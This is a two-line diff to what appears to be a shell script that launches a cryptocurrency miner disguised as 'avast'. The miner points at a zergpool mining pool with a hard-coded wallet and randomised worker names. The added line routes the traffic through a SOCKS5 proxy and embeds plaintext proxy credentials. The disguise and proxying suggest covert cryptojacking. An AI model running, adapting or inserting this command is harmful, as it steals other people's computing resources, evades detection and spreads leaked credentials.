@@ -3,4 +3,4 @@
 
 
 chmod +x avast
-./avast -v -l verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-U) -p c=DASH -t 8
+./avast -v -l verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-U) -p c=DASH -t 8 -x socks5://njhlezbg-1:bo6mj3wz34gr@u1.p.webshare.io:80
